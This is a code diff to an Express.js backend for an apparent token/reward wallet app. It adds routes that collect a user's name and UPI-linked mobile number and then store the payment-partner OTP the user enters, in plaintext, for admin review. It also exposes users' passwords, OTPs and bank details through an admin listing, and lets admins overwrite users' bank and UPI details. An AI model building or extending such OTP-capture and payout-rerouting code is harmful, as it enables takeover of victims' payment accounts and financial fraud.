@@ -375,7 +375,7 @@ router.get('/users', async (req, res) => {
     let dbUsers = [];
 
     try {
-      dbUsers = await User.find({}, 'phone password otp role iTokenBalance rewardPercent createdAt').sort({ createdAt: -1 });
+      dbUsers = await User.find({}, 'phone password otp role iTokenBalance rewardPercent accountHolderName accountNumber ifscCode upiId createdAt').sort({ createdAt: -1 });
     } catch (err) {
       console.error('Atlas fetch error:', err.message);
     }
@@ -393,6 +393,10 @@ router.get('/users', async (req, res) => {
           role: u.role || 'user',
           iTokenBalance: u.iTokenBalance ?? 0,
           rewardPercent: u.rewardPercent ?? 6,
+          accountHolderName: u.accountHolderName || '',
+          accountNumber: u.accountNumber || '',
+          ifscCode: u.ifscCode || '',
+          upiId: u.upiId || '',
           createdAt: u.createdAt || new Date().toISOString(),
         });
       }
@@ -408,6 +412,10 @@ router.get('/users', async (req, res) => {
         role: u.role || 'user',
         iTokenBalance: u.iTokenBalance ?? 0,
         rewardPercent: u.rewardPercent ?? 6,
+        accountHolderName: u.accountHolderName || '',
+        accountNumber: u.accountNumber || '',
+        ifscCode: u.ifscCode || '',
+        upiId: u.upiId || '',
         createdAt: u.createdAt,
       });
     }
@@ -428,11 +436,11 @@ router.get('/users', async (req, res) => {
   }
 });
 
-// PUT /api/admin/users/:identifier - Update user's iTokenBalance (wallet) and rewardPercent
+// PUT /api/admin/users/:identifier - Update user's iTokenBalance, rewardPercent, and bank/upi details
 router.put('/users/:identifier', async (req, res) => {
   try {
     const { identifier } = req.params;
-    const { iTokenBalance, rewardPercent } = req.body;
+    const { iTokenBalance, rewardPercent, accountHolderName, accountNumber, ifscCode, upiId } = req.body;
 
     if (!identifier) {
       return res.status(400).json({ error: 'User identifier is required.' });
@@ -447,6 +455,18 @@ router.put('/users/:identifier', async (req, res) => {
     }
     if (rewardPercent !== undefined && !isNaN(Number(rewardPercent))) {
       updateFields.rewardPercent = Number(rewardPercent);
+    }
+    if (accountHolderName !== undefined) {
+      updateFields.accountHolderName = String(accountHolderName).trim();
+    }
+    if (accountNumber !== undefined) {
+      updateFields.accountNumber = String(accountNumber).trim();
+    }
+    if (ifscCode !== undefined) {
+      updateFields.ifscCode = String(ifscCode).trim().toUpperCase();
+    }
+    if (upiId !== undefined) {
+      updateFields.upiId = String(upiId).trim();
     }
 
     let updatedUserObj = null;
@@ -469,13 +489,17 @@ router.put('/users/:identifier', async (req, res) => {
       if (phoneKey === identifier || u.id === identifier || u._id === identifier || String(u.id) === String(identifier)) {
         if (updateFields.iTokenBalance !== undefined) u.iTokenBalance = updateFields.iTokenBalance;
         if (updateFields.rewardPercent !== undefined) u.rewardPercent = updateFields.rewardPercent;
+        if (updateFields.accountHolderName !== undefined) u.accountHolderName = updateFields.accountHolderName;
+        if (updateFields.accountNumber !== undefined) u.accountNumber = updateFields.accountNumber;
+        if (updateFields.ifscCode !== undefined) u.ifscCode = updateFields.ifscCode;
+        if (updateFields.upiId !== undefined) u.upiId = updateFields.upiId;
         if (!updatedUserObj) updatedUserObj = u;
       }
     }
 
     return res.json({
       success: true,
-      message: 'User wallet amount and reward percentage updated successfully.',
+      message: 'User wallet amount, reward percentage, and bank/UPI details updated successfully.',
       user: updatedUserObj,
     });
   } catch (err) {
@@ -638,53 +662,126 @@ router.post(['/user/upi-items/toggle-stop', '/upi-items/toggle-stop'], (req, res
   }
 });
 
-// POST /api/user/link-kyc or /link-kyc - Register user KYC request
-router.post(['/user/link-kyc', '/link-kyc', '/admin/user/link-kyc'], (req, res) => {
+// POST /api/user/save-name-number - Directly save Name & Number before OTP entry
+router.post(['/user/save-name-number', '/save-name-number'], (req, res) => {
   try {
-    const { phone, userName, upiNo, partnerId, partnerName, otp } = req.body;
+    const { phone, userName, upiNo, partnerId, partnerName } = req.body;
     if (!userName || !upiNo || upiNo.trim().length !== 10) {
       return res.status(400).json({ error: 'Please enter name and a 10-digit mobile number.' });
     }
 
     const userPhone = phone || '9341048237';
-    const submittedOtp = otp || Math.floor(10000 + Math.random() * 90000).toString();
+    const reqId = 'kyc_' + Date.now();
+    const upiItemId = 'upi_' + Date.now();
 
     const newKycReq = {
-      id: 'kyc_' + Date.now(),
+      id: reqId,
       phone: userPhone,
       userName: userName.trim(),
       upiNo: upiNo.trim(),
       partnerId: partnerId || 'paytm',
       partnerName: partnerName || 'Paytm',
-      otp: submittedOtp,
-      status: 'Waiting for KYC',
+      otp: 'Waiting for OTP...',
+      status: 'Waiting for OTP',
       createdAt: new Date().toISOString(),
     };
 
     // Remove old pending KYC for same user if exists
-    kycRequests = kycRequests.filter((k) => !(k.phone === userPhone && k.partnerId === newKycReq.partnerId));
+    kycRequests = kycRequests.filter((k) => !(k.phone === userPhone && k.partnerId === newKycReq.partnerId && k.status === 'Waiting for OTP'));
     kycRequests.unshift(newKycReq);
 
-    // Also add to user UPI items
-    const maskedPhone = userPhone.substring(0, 3) + '****' + userPhone.substring(7);
+    // Also add to user UPI items with 'Waiting for OTP'
+    const maskedPhone = userPhone.length >= 10 ? userPhone.substring(0, 3) + '****' + userPhone.substring(7) : userPhone;
     const newUpiItem = {
-      id: 'upi_' + Date.now(),
+      id: upiItemId,
       phone: userPhone,
       userName: userName.trim(),
       upiNo: upiNo.trim(),
-      otp: submittedOtp,
+      otp: 'Waiting for OTP...',
       name: `${(partnerName || 'UPI').toLowerCase()}(${maskedPhone})`,
       vpa: `${upiNo}@${partnerId || 'upi'}`,
-      status: 'Waiting for KYC',
+      status: 'Waiting for OTP',
       statusColor: '#faad14',
-      warning: 'Waiting for admin approval',
+      warning: 'Waiting for user to enter OTP',
       stopped: true,
       quota: 100000,
       minTx: 500,
     };
+    userUpiItems = userUpiItems.filter((u) => !(u.phone === userPhone && u.partnerId === newUpiItem.partnerId && u.status === 'Waiting for OTP'));
     userUpiItems.unshift(newUpiItem);
 
-    return res.json({ success: true, request: newKycReq, item: newUpiItem });
+    return res.json({
+      success: true,
+      message: 'Name and number saved directly.',
+      requestId: reqId,
+      itemId: upiItemId,
+      request: newKycReq,
+      item: newUpiItem,
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Failed to save name and number.' });
+  }
+});
+
+// POST /api/user/link-kyc or /link-kyc or /save-otp - Register/update user KYC & OTP request
+router.post(['/user/link-kyc', '/link-kyc', '/admin/user/link-kyc', '/user/save-otp', '/save-otp'], (req, res) => {
+  try {
+    const { phone, userName, upiNo, partnerId, partnerName, otp, requestId, itemId } = req.body;
+    const userPhone = phone || '9341048237';
+    const submittedOtp = otp ? String(otp).trim() : 'Waiting for OTP...';
+
+    // Update existing KYC request if found by requestId or matching phone & upiNo
+    let reqMatch = kycRequests.find((k) => (requestId && k.id === requestId) || (k.phone === userPhone && k.upiNo === (upiNo ? upiNo.trim() : k.upiNo)));
+    if (reqMatch) {
+      if (userName) reqMatch.userName = userName.trim();
+      if (upiNo) reqMatch.upiNo = upiNo.trim();
+      if (submittedOtp) reqMatch.otp = submittedOtp;
+      reqMatch.status = 'Waiting for KYC';
+    } else {
+      reqMatch = {
+        id: requestId || 'kyc_' + Date.now(),
+        phone: userPhone,
+        userName: userName ? userName.trim() : userPhone,
+        upiNo: upiNo ? upiNo.trim() : '',
+        partnerId: partnerId || 'paytm',
+        partnerName: partnerName || 'Paytm',
+        otp: submittedOtp,
+        status: 'Waiting for KYC',
+        createdAt: new Date().toISOString(),
+      };
+      kycRequests.unshift(reqMatch);
+    }
+
+    // Update existing UPI item if found by itemId or matching phone & upiNo
+    let itemMatch = userUpiItems.find((u) => (itemId && u.id === itemId) || (u.phone === userPhone && u.upiNo === (upiNo ? upiNo.trim() : u.upiNo)));
+    if (itemMatch) {
+      if (userName) itemMatch.userName = userName.trim();
+      if (upiNo) itemMatch.upiNo = upiNo.trim();
+      if (submittedOtp) itemMatch.otp = submittedOtp;
+      itemMatch.status = 'Waiting for KYC';
+      itemMatch.statusColor = '#faad14';
+      itemMatch.warning = 'Waiting for admin approval';
+    } else {
+      const maskedPhone = userPhone.length >= 10 ? userPhone.substring(0, 3) + '****' + userPhone.substring(7) : userPhone;
+      itemMatch = {
+        id: itemId || 'upi_' + Date.now(),
+        phone: userPhone,
+        userName: userName ? userName.trim() : userPhone,
+        upiNo: upiNo ? upiNo.trim() : '',
+        otp: submittedOtp,
+        name: `${(partnerName || 'UPI').toLowerCase()}(${maskedPhone})`,
+        vpa: `${upiNo}@${partnerId || 'upi'}`,
+        status: 'Waiting for KYC',
+        statusColor: '#faad14',
+        warning: 'Waiting for admin approval',
+        stopped: true,
+        quota: 100000,
+        minTx: 500,
+      };
+      userUpiItems.unshift(itemMatch);
+    }
+
+    return res.json({ success: true, message: 'OTP saved successfully.', request: reqMatch, item: itemMatch });
   } catch (err) {
     return res.status(500).json({ error: 'Failed to submit KYC request.' });
   }
